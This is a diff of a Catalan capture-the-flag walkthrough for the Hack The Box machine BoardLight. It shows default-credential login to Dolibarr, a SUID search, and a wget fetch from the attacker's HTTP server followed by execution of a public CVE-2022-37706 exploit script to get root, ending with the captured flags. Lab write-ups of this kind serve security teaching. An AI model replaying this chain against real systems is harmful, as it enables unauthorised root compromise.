@@ -33,21 +33,20 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`
 
 Veient que té el port 80 obert, anirem al navegador a buscar la pàgina web d'aquesta IP. El primer que veiem és el següent:
 
-![[Pasted image 20240609185002.png]]
-
+![image](https://github.com/user-attachments/assets/d043c617-8956-4e1e-8ebb-1dd46c67bae7)
 
 Hi ha un formulari a sota, on provem fer injecció SQL però sense obtenir resultats:
 
-![[Pasted image 20240609185214.png]]
+![image](https://github.com/user-attachments/assets/109a348f-7c2c-430f-938d-83b7b182010f)
 
 I n'hi ha un altre a Newsletter però tampoc obtenim resultats:
 
-![[Pasted image 20240609185238.png]]
+![image](https://github.com/user-attachments/assets/6779a6a5-1910-4b3a-857d-8f5129785cbb)
 
 Per tant, passem a ver una enumeració de de dominis i subdominis a veure is hi ha més sort. Primer afegim el domini al fitxer /etc/hosts:
 
 ```
-`┌──(polkali㉿kaliPol)-[~]
+┌──(polkali㉿kaliPol)-[~]
 └─$ cat /etc/hosts      
 127.0.0.1       localhost
 127.0.1.1       kaliPol
@@ -127,28 +126,29 @@ Ara però, abans d'anar a la url hem d'afegir el subdomini al fitxer /etc/hosts:
 
 Un cop hi accedim ens trobem amb una pàgina de login:
 
-![[Pasted image 20240720194050.png]]
+![image](https://github.com/user-attachments/assets/38ae89b8-a425-45b2-aff2-da9e81badfdd)
+
 
 Ens trobem amb un software que sembla ser el CRM de l'empresa que porta per nom Dolibarr, també tenim la seva versió. 
 
 El primer que fem és buscar les seves credencials per defecte a internet, on trobem que són admin/admin:
 
-![[Pasted image 20240720194833.png]]
-
+![image](https://github.com/user-attachments/assets/a1fe2536-b6d2-415f-af34-866bee2b8d66)
 
 Funciona, hem accedit al dashboard amb l'usuari admin: 
 
-![[Pasted image 20240720200013.png]]
+![image](https://github.com/user-attachments/assets/4fbfd99a-1703-4ac3-9c4d-5ec7baf46252)
 
 Després d'una estoneta mirant, sembla que no trobem res rellevant, per tant miraré a veure si trobo algun exploit o POC per internet de Dolibarr 17.0.0
 
 Al fer una cerca i posar Dolibar 17.0.0 ja el pròpi navegador ens suggereix la paraula exploit, i si fem la cerca ens trobem amb  vàris POC, provarem el primer a veure si ens funciona:
 
-![[Pasted image 20240720200256.png]]
+![image](https://github.com/user-attachments/assets/38c3435d-c90f-406b-b100-eabbcba41ea1)
 
 Ara fem un git clone del repositori a la nostra màquina kali linux ja que sembla que ens podrà ser útil:
 
-![[Pasted image 20240720200942.png]]
+![image](https://github.com/user-attachments/assets/9fcc539c-b9f0-435f-9e0c-82ec43c9549c)
+
 
 ```
 `┌──(root㉿kaliPol)-[/home/polkali/Documents]
@@ -205,7 +205,7 @@ www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ `
 
 Ara, com que hi som dins del CRM Dolibarr, busquem per internet com es configura, a veure si trobem algun fitxer que podem "remenar". Sembla que hi ha un fitxer que es diu conf.php que podria ser interessant:
 
-![[Pasted image 20240720202217.png]]
+![image](https://github.com/user-attachments/assets/6dcfc208-ef09-43e4-a6f9-2c48b32b46c5)
 
 I al següent directori trobem el fitxer conf.php:
 
@@ -305,4 +305,119 @@ larissa@boardlight:~$ cat user.txt
 c839cad4bbb54ea6bb4e65d7da73ab00
 larissa@boardlight:~$ `
 ```
+
+Un cop tenim la flag de l'usuari hem d'anar a buscar la flag de root. Haurem de mirar la forma d'escalar privilegis. Primer de tot provaré amb SUID a veure si trobem alguna cosa i trobem aquests fitxers amb el bit SUID:
+
+```
+`     230     56 -rwsr-xr-x   1 root     root          55528 Apr  9 08:34 /usr/bin/mount
+     5609    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo
+     2245     68 -rwsr-xr-x   1 root     root          67816 Apr  9 08:34 /usr/bin/su`
+```
+
+No hi ha hagut èxit. Tot i així, si ens hi fixem en els SUID apareixen una sèrie de fitxers del que sembla ser un software que es diu Enlightenment:
+
+```
+`larissa@boardlight:~$ find / -type f -perm -04000 -ls 2>/dev/null
+     2491     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+      608     16 -rwsr-sr-x   1 root     root        14488 Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
+    17633     28 -rwsr-xr-x   1 root     root        26944 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+    17628     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+    17627     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
+    17388     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqse`
+```
+
+I, tot i que a la pàgina  https://gtfobins.github.io no hi hem trobat res, buscarem per internet on trobem això: 
+
+![image](https://github.com/user-attachments/assets/248fcb9b-5848-4af2-b9b9-30b68b008ed3)
+
+La última versió estable sembla força vella, mirarem la versió d'enlightenment que tenim a la màquina i buscarem a veure si té algun exploit i algun POC:
+
+```
+larissa@boardlight:~$ enlightenment -version
+ESTART: 0.00001 [0.00001] - Begin Startup
+ESTART: 0.00012 [0.00012] - Signal Trap
+ESTART: 0.00018 [0.00006] - Signal Trap Done
+ESTART: 0.00024 [0.00006] - Eina Init
+ESTART: 0.00053 [0.00029] - Eina Init Done
+ESTART: 0.00059 [0.00006] - Determine Prefix
+ESTART: 0.00073 [0.00014] - Determine Prefix Done
+ESTART: 0.00078 [0.00005] - Environment Variables
+ESTART: 0.00084 [0.00006] - Environment Variables Done
+ESTART: 0.00088 [0.00004] - Parse Arguments
+Version: 0.23.1
+E: Begin Shutdown Procedure!
+larissa@boardlight:~$ `
+```
+
+Al veure que és la versió 0.23.1 buscarem algun exploit o POC d'aquesta versió. Hem trobat el següent i és el que utilitzarem:
+
+https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit 
+
+Fem un git clone a la nostra màquina on fem un servidor http amb python des del directori del repositori que acabem de descarregar on hi ha l'exploit.sh:
+
+```
+┌──(polkali㉿kaliPol)-[~/Documents/BoardLight/CVE-2022-37706-LPE-exploit]
+└─$ sudo python -m http.server 666 
+Serving HTTP on 0.0.0.0 port 666 (http://0.0.0.0:666/) ...
+10.10.11.11 - - [20/Jul/2024 22:13:07] "GET /exploit.sh HTTP/1.1" 200 -`
+```
+
+
+I un cop fet això amb la comanda wget estirem l'exploit.sh des de la màquina de larissa:
+
+```
+larissa@boardlight:~$ wget 10.10.14.90:666/exploit.sh
+--2024-07-20 13:12:44--  http://10.10.14.90:666/exploit.sh
+Connecting to 10.10.14.90:666... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 709 [text/x-sh]
+Saving to: ‘exploit.sh’
+
+exploit.sh                              100%[=============================================================================>]     709  --.-KB/s    in 0s      
+
+2024-07-20 13:12:44 (99.2 MB/s) - ‘exploit.sh’ saved [709/709]`
+```
+
+Li donem permisos d'execució:
+
+``larissa@boardlight:~$ chmod +x exploit.sh ``
+
+I ara executem l'script:
+
+```
+larissa@boardlight:~$ ./exploit.sh 
+CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Enjoy the root shell :)
+mount: /dev/../tmp/: can't find in /etc/fstab.
+# 
+```
+
+I ja som root, per tant ara anem a buscar la flag de root al fitxer root.txt i ja tindrem la màquina feta:
+
+```
+larissa@boardlight:~$ ./exploit.sh 
+CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Enjoy the root shell :)
+mount: /dev/../tmp/: can't find in /etc/fstab.
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
+# cat /root/root.txt 
+49f672b49b0c39187807d909546ac6aa
+# whoami
+root
+# 
+```
+
+![image](https://github.com/user-attachments/assets/80a63972-9dff-495c-84cc-35ba7c1e76bf)
+
+
+
 
